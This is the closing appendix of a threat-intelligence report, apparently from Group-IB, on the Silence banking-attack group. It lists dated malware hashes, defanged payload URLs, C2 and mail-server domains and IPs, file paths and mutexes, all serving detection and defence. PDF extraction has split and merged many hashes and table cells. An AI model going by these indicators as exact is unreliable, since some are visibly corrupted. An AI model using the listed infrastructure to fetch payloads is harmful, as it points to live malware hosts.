wsus.exe file name used? Yes, it is used to name the downloaded and \nlaunched fileYes, the loader file is copied under this \nname.\nWhat is added to startup? A service named foundation Its own file\nWhat system information is \ncollected?Windows version, domain name information Tasklist, qwinsta, ipconfig, hostname, disks, \nWindows version, OS bitness\nIs the collected data sent  \nto the CnC?No Yes\nAre requests to the CnC  \nencoded additionally?No Yes49FlawedAmmyy infrastructure\nThe servers used by FlawedAmmyy are not located where Silence usually hosts them. The \nhypothesis that these attacks are not connected is also supported by the fact that the emails \ncontaining FlawedAmmyy differ greatly from those used by Silence and are delivered to both \nindividuals and companies.\nDownloaders\n25/05/2018 f4b6b0c8787ea344ce9f68f5d506a5d6cc7447114b3d -\ncdbb6d0207372054dfe2http://clodflarechk[.]com/cloud.png\n25/05/2018 5ad873c6b351e0239b74548697fc870b18233b9ab2d7d767baf -\n5f7a3fd5929c5http://clodflarechk[.]com/cloud.png\n07/06/2018 fc5c2cff9afb9f08bab6ef895e07fa70183fc0eb338b662c -\n75cf2305286b93d0http://thespecsupportservice[.]com/\nload.png\n10/06/2018 9b845c90f45d51bd71da48a0a805472ef285590397cb678ad4de4d -\n2de896a0b8http://thespecsupportservice[.]com/\nload.png\n18/06/2018 edeb70a8c3ff5f014352035ac7414d7fe8d028ac4ab8b95afb7cd -\nbe7f42c46d9http://185.176.221[.]29/ban3.dat\n28/06/2018 07b395267cfb60f24de7192b7dbf4bdcdf8d663a21fdaabbcef -\n3fc20093ae087http://147.135.170[.]169/kernel.dat\n11/09/2018 8f28b7dc92b7c60b8ede821dae400746e257c447c05957d8c6b6f -\nd4eb94fc19dhttp://185.17.121[.]223/date2.date\n18/09/2018 d964b7c1d01dfaa287e5613ba918729d7cf7234d81532bfe193ed -\n406eec2a773http://185.180.196[.]43/date2.dat\n18/09/2018 589975a352b07295b4c731e3165cadeb895634a30d8f028170b -\n9d49abd73e470http://79.137.127[.]216/ba.dat\n19/09/2018 c24815aed025eac9ff8946e8c9ca861eb6aae691959204893056ae -\nce6f71a1ebhttp://185.180.196[.]43/date1.dat\n20/09/2018 a46afd89dafd0df1adbf50915bb46655b07f378edfaa7e94f -\nd5940a50ff58716http://185.180.196[.]43/date2.dat\n20/09/2018 14acf544c4f04b82a951da4c09a3baaa3049030e9e4b4d12e -\nce5d856b03b58d2http://185.180.196[.]43/date2.dat\n23/09/2018 c998d74dc9b7ebe9864d451752c7d8eafdf334bacbf09dbcfcb7548d -\na1cc05e6http://185.180.196[.]43/date1.dat\n25/09/2018 ec7c0c1f00b1c92510d8b959fb4201163abd0bf0fee3a3e32901ce -\nc95d1d7d77http://185.17.121[.]223/date1.date\n17/10/2018 6703dbf496bb331a109ee5824c8ff4c0281861d8478470b -\n63c4580e4676d26e1http://msboxoffice[.]com/date1.dat\n17/10/2018 a673f1545649e3e9b19c37389a76ea66844ea1f -\n307b702ab7118ad819ffcb4fchttp://msboxoffice[.]com/date1.dat\n17/10/2018 8f6b5dc882b171b166d9009f29159cce029d35586d363116113f09b-\nf7140ea6ehttp://msboxoffice[.]com/date1.dat\n07/12/2018 6e55fc56eb8224ab3ee1f8df81626d5f5737a923c3ae4202affaf -\n2d1a2b57c68http://31.207.45[.]85/d.dat\n03/01/2019 b6022ffc9fc24378102145071d912a75c0dc47c1a1639b341fd -\ncee38f55fdf31http://31.207.45[.]85/d.dat50Downloaders\n13/02/2019 6b8c9f93232dbc4c83708c3b3c534ecc695937b41a -\n446c16ae6fb84d11117da7http://185.17.123[.]201/dat1.omg\n13/02/2019 de6c44683c489a7cb26bd435199aa327b7df8f0be31cc474cf98c -\n7cab9b3abb5http://185.17.123[.]201/dat2.omg\n13/02/2019 6c4e2c2de91c728bb5f0c407be3b01585bfdbcbbdade4fafc0779c9f -\nc2dceeechttp://185.17.123[.]201/dat3.omg\n19/02/2019 01db49c3afcb46c593bc7247f04f8ae87abf04c585de -\n57557b1e5a89a14588a6http://185.17.120[.]235/dat3.omg\n19/02/2019 9a58aeab3ddfc5d1b13ec0c8718b1f0c5cf934cbd0a61a93d906a9b -\n7ca3860ddhttp://185.17.120[.]235/dat1.omg\n19/02/2019 a77c85a15c8d873396d2d299a58ce49cf7044703189977c21c5a -\n17c2eb9ec451http://185.17.120[.]235/dat3.omg\n19/02/2019 0a7e6a1ed2b4111dd285cf2582e794e18fb4c25d85329c1f6b -\n15f27a68741dcbhttp://185.17.120[.]235/dat4.omg\n19/02/2019 4efe3097dac309a1619415e1ef8654f0b30b516e601d6c4c061cf -\ncd9dd876968http://185.17.120[.]235/dat1.omg\n19/02/2019 ffaad77e7c2e56b965fe38dfdd490572321d29e00f5b -\n1f27e692c4f697d72904http://185.17.120[.]235/dat1.omg\n20/02/2019 d1d9657b4230b63ff7b5f94ecd21660c3edf314fcf23b -\n745226fae806d456cb8http://213.183.63[.]242/fact1.omg\n20/02/2019 014d47cc2ee73efb3ec06a72d886888fc -\nc2489ce8e8323f57ee03295439e6f34http://195.123.209[.]169/dat1.omg\n22/02/2019 17ace58c2d19cd852f9b3b1f27aea925d015593998b52260dd4\nf2ee075260880http://dorlon-sa[.]com/~dorlon/  \n181.dat\n27/02/2019 81edbd0ebf33aa7d751e0b44f66b3fc2f5a243ca80dad -\n6c0188f40fd860f58ddhttp://91.200.41[.]236/s.dat\n01/03/2019 17a3f9e74cb4691035e7e09f1432e507a7bb31ef -\n33cb8511674b58d95d1670a6http://185.162.131[.]87/p.dat\n06/03/2019 80c9296ef0e1a250ca4b3911a02d90221bdc9b2b12dc9e-\nb6a5b8e5f1778493fehttp://185.231.155[.]59/s.dat\n06/03/2019 2ad7ac74e6e21a2d36bcbf28a3988f5ad1b3fa86a6e74ed9bbf3d15c -\n4cbac32bhttp://185.128.213[.]12/s.dat\n06/03/2019 d864fa83a75edf68d81baea5a40a143096c1db5237cc6d -\nb807601eaa9e4e6d22http://31.41.47[.]190/s.dat\n06/03/2019 dd76664175d0f97c37fbfea5071c043412721dc3a975b6c54b6d -\nf9abe73bc1d1http://167.179.86[.]255/dns.dat\n11/03/2019 fb704b02ec395f339aebe658f7a69e7b67f6950c9e92f -\nb96aaa9d3973fb24839http://202.168.153[.]228/dns3.dat\n12/03/2019 b759fe01c5a6eb03fd1d30fd5ea9ec9841a7622f81b -\n37b449e098bc88895a558http://clodflarechk[.]com/cloud.png\n15/03/2019 b2578d68dbd6100450217318e3744fbc3445e1fd -\nd04820a777156a0dc4cd4df1http://185.231.155[.]59/s.dat\n16/03/2019 b4b998c64566818bd273172573c8c35cee3602b711d8c3d -\nc5245ddf4a5ba278bhttp://91.200.41[.]236/s.dat51Payloads\n05/06/2018 7f61258418b89942aa8e7bf2563ce11a05402d3ccf405a18e3d0a4d7a7f9ee41 185.222.202[.]139\n07/06/2018 ba8ed406005064fdffc3e00a233ae1e1fb315ffdc70996f6f983127a7f484e99 103.208.86[.]140\n13/06/2018 bce75d6ec2b8d7419044ba8302c96bbdeec0354b0dc764e19ec4e7aa44e8ef13 169.239.129[.]125\n25/06/2018 7bf942db8cc97f6274754e1f4d16dcf14e9d21c09038746895e27b64fcfcdfe4 103.208.86[.]39\n26/06/2018 18732545bc6fe6035f92d3b3aa0bfc06f031be2f26f556ad76f06e9573d384d9 103.208.86[.]252\n12/07/2018 42ded82ef563db3b35aa797b7befd1a19ec925952f78f076db809aa8558b2e57 185.99.132[.]119\n13/07/2018 73e149adb7cc2a09a7af59aecd441fd4469fc0342b687097cadfbce10896c629 103.208.86[.]226\n17/07/2018 557db9e6398fd38b7f215bbbc18d433c5c49a86adfba0cb9dbc9ea272366d727 185.99.132[.]128\n17/07/2018 56f1ab4b108cafcbada89f5ca52ed7cdaf51c6da0368a08830ca8e590d793498 169.239.128[.]150\n17/07/2018 c2080983598643a2498d1f6ef3f1cc9dc58a784a69e3f313f18dc1b8e0afbc17 185.99.132[.]128\n17/07/2018 89590e12f45b01e70563205a67db70645f8bb534ab6fdf54fba1f7d36f614d67 169.239.129[.]3\n19/07/2018 773f08e332a9bf8648c1cad76186e1120025dae9aac402c0ca1ba7b71d8af9c9 185.99.132[.]128\n14/08/2018 efeadabb39db0f7087ecec71b31f198727443beef8fa030ee2dfe5266d78603b 169.239.129[.]27\n21/08/2018 8cbf24dbbe16fa051ba13b3bc84b1b2c359206488f8fd35e1bc89339813ae180 185.99.132[.]128\n21/08/2018 7d0eef74bc6cdc0d6af977fcdcd94af9859fbac84671e869409b2e141cc131d0 185.99.132[.]128\n22/08/2018 b966e1a71719361338e861800c3c989b22336e4a4497c28f75398c4804a250c6\n23/08/2018 8947f9468f16ab3eebb56d546034061d7073e29b5010444e385aa3937b10a81e\n17/09/2018 ebce43d96b77e0e6a395a7cbde462b90abbc91894dbd80c2a413286aa24e3435 185.99.132[.]12\n16/10/2018 35613fdfb5940ead5d2f2c124ccf6d022d308b6efbffecead20e57202292f423 185.99.132[.]128\n17/10/2018 bb6d7888b7538c8df9c7b3fb4baedd2e8309c39df527c0d48bfb46bc87918de4 169.239.129[.]27\n17/10/2018 ed5d29a19f3aed2c870051d639b974f16682a2463fd20bd230594102c39958dd 169.239.129[.]27\n17/10/2018 50c94e998a1c387ba7af19f870716c0299f5e9ffd8fa3bd721f120ede8f1b440\n17/10/2018 e525e1b3367eb427002fd84a5b5d7ac18df93fce4412d0f18aaa6b1141cc56c2\n24/10/2018 f143a594fa59150afc7503a8e18a0986bbe7985e8c4480b11f49344194317bd4\n27/11/2018 8f21ac40c116f25276c5c52a64ef883bd80d28a5d09f589cbc7180ac4b009abb\n29/11/2018 f318b1fe2d131e67ac1a1800e59dc1373464c69992008db4dac436bed90225e8 169.239.129[.]27\n07/12/2018 c8156fef756fdc195b0acfad767ce26c304c8dccd1ba8f3fb7efb7f1e08cd1e6 185.255.79[.]44\n18/02/2019 56b57fc829774aa4423b7a29ff5a081b75167d2466898acbc7d89e717bfb4869 185.99.133[.]83\n19/02/2019 7ecfd68341fe276c17246dc51c5d70ee2c1bbc6801c85201c8a62956c23d872d 185.99.133[.]83\n20/02/2019 af1d155a0b36c14626b2bf9394c1b460d198c9dd96eb57fac06d38e36b805460 185.255.79[.]67\n22/02/2019 8562d866b475e221a5394e6ddeec67ccdb49faa752dd25b76281842bec8c2907 169.239.129[.]31\n22/02/2019 bccddce212adc252328a56af862c1310d084fcfd3838ffe6c36fb4e0ff64ca78 185.99.133[.]2\n26/02/2019 6e53d7e07e04b718825f6ab209a74ecbcfc6285097f0c0f9d332e8c0f54e1097 169.239.128[.]15\n06/03/2019 4425fec38db7503a3cb1a1be48d14881a18a00ccef7a975a0d64fba1191d8b09 91.201.65[.]181\n10/03/2019 03318d195541590cce94df7ec95ba899e5cd0dbac813a4042ac7efaa9a01f9ed 146.0.77[.]6252Payloads\n10/03/2019 1b5a01df930dbaaf8a61a948b2d7205eed023022c5d76c03144daeae0442e5ca\n15/03/2019 dd11953288c33ca020301ec639efa1a42f87059fb1adafde58343db7002d4b4b\n21/03/2019 127178ad32549676de47111180a356bfc1184bb0de8e3ce46a61da6a170489de\n21/03/2019 64edb1c153edd7ed92b2847f9ba703b1254924f046f8873459e74ecb9bb4d6d753IOC s\nThe list of indicators below is not comprehensive and only complements the IOCs provided in the \nreport Silence: Moving into the darkside.\nFile system\n%APPDATA%\\temps.dat\n%APPDATA%\\<string>-[0-9a-f]{8}.exe\n%PROGRAMDATA%\\<filename>.exe\ngxftcp.dat\nC:\\xfsasdf.txt\nc:\\windows\\st.exe\nc:\\hp\\dotnet.exe\nc:\\hp\\1.txt\nc:\\hp\\SocksTest.exe\nc:\\intel\\asyncbridge.net35.dll\nc:\\intel\\sockstest.exe\nc:\\hp\\SocksTest.exe\nRegistry\nнесанкционированные ключи в HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\\nRun\nMutexes\nGlobal\\\\00000539[random_dword]\nHashes\n06bd5fc2eb2b00cabfe279b1321e6671f0c768be — Silence.Downloader aka TrueBot\n1cc39211d98e3e11dc9afd499f97b93043c470fb — Silence.Downloader aka TrueBot\n93223c0dbc7df43e4d813c9809cde1263aaf4ec3 — Silence.Downloader aka TrueBot\n2a54b8216b96897f9f5c31992ea0d6b43b96f32b — SIlence.ProxyBot.NET\nc59cb38bcada36d8c7a671642146ff39f1f49693 — Silence.MainModule\n957538ca1a87ce6cbf4f840777c032811d82bf55 — CVE-2017-11882/CVE-2018-0802\n2cd620cea310b0edb68e4bb27301b2563191287b — Silence.Downloader aka TrueBot\nf3a639f2659709c76b70a0c2dd7dc3ef1d12103b — Silence.Downloader aka TrueBot\n3e796c9580de47fe994cbbfcc8c383375ab4618b — Silence.Downloader aka TrueBot542250174b8998a787332c198fc94db4615504d771 — CHM\n1b8c71131891dc1c728349405409a687caeefdbc — Silence.Downloader aka TrueBot\nd1dd819dc64c26913d2d9ec8dd4ad9c4e26512a9 — Silence.Downloader aka TrueBot\nd0dcfbeeb9f81af8bad758d5e255a412ad5a7004 — Silence.Downloader aka TrueBot\nCC3875B9A8062B3BC97564C922EF8440FA95923C — Malicious DOC\n3A8E362F8183BC9D33320F03285CEEA07FD19250 — Malicious DOC\n272FCD5C45C1F8A42B15B95DF7D293CC8FE22375 — Malicious DOC\n7FE56AC2B3EEDC4E51021ED3C0C83B8722F2BF07 — Malicious DOC\n7E4CB7E39B314F92252791597A45D685A5A38A7D — CHM\n8D37648A1AD242F8EAB2016AAEE7A5B314757764 — VB script\nC58642A02F848D437C30027C6455D07587477423 — VB script\nE4B7DBDAD70443C565673DC46D8EEA05DD5C2B69 — DOC\n76F1492A32C82CB1A003C2B0AAEC20E0 — CHM\nfe1f5f9774e2b58af0b51453c933931648f7aa47\n81673f941092618231599e910300249e13903c32 — Silence.Downloader aka TrueBot\nd044bc7fb58792a6bf612116662df892a306a931 — CHM\n290af346e9e235501e4004f997266f7256755669 — VB script\n256bb2d559885b3116e64797ac57c0102a905296 — Silence.Downloader aka TrueBot\nc572ba3fcd991fd29919d171b8445dbb5277a51d — Silence.Downloader aka TrueBot\n4896d0d045bbfb796731d9f851126e59c87fc580 — Silence.Downloader aka TrueBot\n20688dbbfd8b96e23663e059cd7a7ddb5a997dcd — Connection checker\n640560fa36cf9d3b9b134bd9b951e8d5c9a3e3e6 — Silence.Downloader aka TrueBot\nebe222153f3663239522812dc349a9a1fd95f717 — Silence.ProxyBot.NET\n2beacf1ca098550b829b4b0d9b4f723ad8d1978e — Silence.Downloader aka TrueBot\n5fcb0495cf70946cf606b95b51ead132e4dded3e — Silence.ProxyBot.NET\n4d0d5ecaea133dbcc603119a5271796bfe371036 — LNK\nf858c23c03a598d270eba506f851fb14685809fd — Ivoke downloader\n1477b18e917c295df9b3c5624e91057999a3f2b6 — Silence.MainModule\n818c0ade5cc1000a7ac7088b431d44a681e06d7b — DOC\n974f24e8f87e6a9cce7c6873954ecab50ffa6f92 — Silence.Downloader aka TrueBot\n7a2aad56c8306a062279645686c59cbf2b2647c4 — Silence.MainModule\n7067326bf1efd4898afa4318b1b1ceba0da86bb3 — Silence.ProxyBot\nEDAF75C6B649C48EC1CA78156BB49503B6183C38 — CHM5562a4ce1c4f81643eda4288f28c158b5f92bf6983 — macro doc\n08c985a9187d3823d89c16f479a56181559681ae — Silence.ProxyBot\n0f5cf45240401aad6ea2118f99eb3fceca9d23e4 — Silence.ProxyBot.NET\ne2955b716250ec0f25510e5bc2ca05fa037ffdad — Silence.ProxyBot.NET\n0b5f0c94ca5251a16bf142f8fdbae117d2996f66 — Silence.MainModule\n15e8fac9c9d5e541940a3c2782df6196ec1e9326 — xfs-disp.exe\nc667cba2b4c2d0426aacfcb7b6cb9c8282dddcdb — Silence.MainModule\n21f557e714f240cd0fff365a454c57849a87170c — Silence.Downloader aka TrueBot\nf88d4e44d85ef3acc24c8b459c68915c76e792ed — EDA\ncd4e470e7448e8d9e559fd2029a069829c6190cb — Silence.ProxyBot.NET\nDomains and IP addresses\nAddress Destination Hosting/Registrar Date (MM-YYYY)\n5.39.221[.]46 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-07\nmobilecommerzbank[.]com mail servermail server Public domain registry 2018-08\n5.39.218[.]205 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-08\n5.8.88[.]254 Silence.Downloader CnCSilence.\nDownloader CnCMorene 2018-05\n91.243.80[.]200 Silence.Downloader hostingSilence.\nDownloader hostingMorene 2018-05\nfpbank[.]ru mail servermail server R01-RU 2018-05\n84.38.133[.]22 Silence backendSilence backend Dataclub 2018-07\nitablex[.]com Silence backendSilence backend GoDaddy 2018-07\nsbbank[.]ru mail servermail server Ru-Center 2018-10\n146.0.77[.]18 Silence.Downloader hostingSilence.\nDownloader hostingHostkey 2018-10\n5.39.221[.]60 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-10\n91.243.80[.]84 Silence backendSilence backend Morene 2018-09\n84.38.134[.]103 Silence backendSilence backend Dataclub 2018-10\n74.220.215[.]239 mail servermail server Unified Layer 2018-11\n146.0.72[.]139 Silence.Downloader hostingSilence.\nDownloader hostingHostkey 2018-11\n146.0.72[.]188 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-1156Address Destination Hosting/Registrar Date (MM-YYYY)\n185.236.76[.]175 Silence backendSilence backend DeltaHost 2018-11\n185.29.10[.]26 Silence backendSilence backend Dataclub 2018-11\n5.39.218[.]162 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-10\n146.0.77[.]104 Silence.Downloader hostingSilence.\nDownloader hostingHostkey 2018-12\n146.0.77[.]112 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2018-12\npharmk[.]group mail servermail server NameCheap 2018-12\ncardisprom[.]ru mail servermail server RegRu 2018-12\nbankrebres[.]ru mail servermail server RegRu 2018-12\n213.183.63[.]227 Silence.Downloader CnCSilence.\nDownloader CnCMelbicom 2018-12\n185.244.131[.]68 Silence.Downloader CnCSilence.\nDownloader CnCGwhost 2018-12\nbasch[.]eu Silence.Downloader hostingSilence.\nDownloader hosting1&1 internet 2019-01\n217.160.233[.]141 Silence.Downloader hostingSilence.\nDownloader hosting1&1 Internet 2019-01\n185.70.187[.]188 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2019-01\n185.70.186[.]146 Silence.Downloader hostingSilence.\nDownloader hostingHostkey 2019-01\n185.36.191[.]42 Silence backendSilence backend Serverius 2019-01\n185.175.58[.]136 Silence.Downloader CnCSilence.\nDownloader CnCHostHatch 2019-01\n185.29.8[.]45 Silence.Downloader hostingSilence.\nDownloader hostingDataclub 2019-02\n5.39.218[.]210 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2019-02\n5.188.231[.]47 Silence backendSilence backend Morene 2019-03\n185.70.184[.]32 EDA backendEDA backend Hostkey 2019-03\ncounterstat[.]pw EDA backendEDA backend NameCheap 2019-03\ncounterstat[.]club EDA backendEDA backend NameCheap 2019-03\n185.20.187[.]89 Silence backendSilence backend DeltaHost 2019-03\n193.109.69[.]5 Ivoke downloaderIvoke downloader Hostkey 2019-05\n185.29.9[.]41 Silence backendSilence backend Dataclub 2019-06\n185.161.208[.]9 Silence.MainModule hostingSilence.\nMainModule hostingDeltaHost 2019-06\n185.70.186[.]149 Silence.Downloader CnCSilence.\nDownloader CnCHostkey 2019-0657Address Destination Hosting/Registrar Date (MM-YYYY)\n185.70.186[.]151 Silence.Downloader hostingSilence.\nDownloader hostingHostkey 2019-06\nzaometallniva[.]ru mail servermail server RegRu 2019-06\n151.248.115[.]41 mail servermail server RegRu 2019-06\n1mliked[.]u mail servermail server Ru-Center 2019-06\n185.154.52[.]83 mail servermail server Eurobyte 2019-06\n185.154.52[.]142 mail servermail server Hostkey 2019-06\n185.236.76[.]216 Silence backend DeltaHost 2019-0658LIST OF SOURCES\n1 https://www.thedailystar.net/frontpage/news/three-banks-hit-cyberattacks-1760629\n2 https://www.youtube.com/watch?v=un1H-92AUeI\n3  https://www.prothomalo.com/economy/article/1597491/%25E0%25A6%25A6%25E0%25A7\n%2587%25E0%25A6%25B6%25E0%25A7%2587-%25E0%25A6%258F%25E0%25A6%25AE\n%25E0%25A6%25A8-%25E0%25A6%259C%25E0%25A6%25BE%25E0%25A6%25B2%25E0\n%25A6%25BF%25E0%25A7%259F%25E0%25A6%25BE%25E0%25A6%25A4%25E0%25A6\n%25BF-%25E0%25A6%2595%25E0%25A6%2596%25E0%25A6%25A8%25E0%25A7%258B-\n%25E0%25A6%25A6%25E0%25A7%2587%25E0%25A6%2596%25E0%25A6%25BE-%25E0%\n25A6%25AF%25E0%25A6%25BE%25E0%25A7%259F%25E0%25A6%25A8%25E0%25A6%25\nBF&sa=D&ust=1564743784434000&usg=AFQjCNEkBE7L26omHjGM7NuAnSFO2STrMA\n4  https://www.dhakatribune.com/bangladesh/crime/2019/06/02/police-bank-authorities-in-\ndark-over-atm-fraud&sa=D&ust=1564743784434000&usg=AFQjCNFVLOfhxVGNXWlOy1In\nyRxP-7N1pQ\n5  https://www.thedailystar.net/frontpage/news/three-banks-hit-cyberattacks-1760629&sa=D&us\nt=1564743784434000&usg=AFQjCNFOB7KqwoX53kORZTWb5zM6OC0Xcg\n6  https://www.youtube.com/watch?v%3Dun1H-92AUeI&sa=D&ust=1564743784435000&usg=\nAFQjCNEJo9GAykaCBFftiIYrXhKp605S6A\n7  https://www.kommersant.ru/doc/388148459\nPreventing and investigating  \ncybercrime since 2003.\nwww.group-ib.com\nblog.group-ib.cominfo@group-ib.com\n+65 31 59 37 98twitter.com/groupib_gib\nlinkedin.com/company/group-ib"
}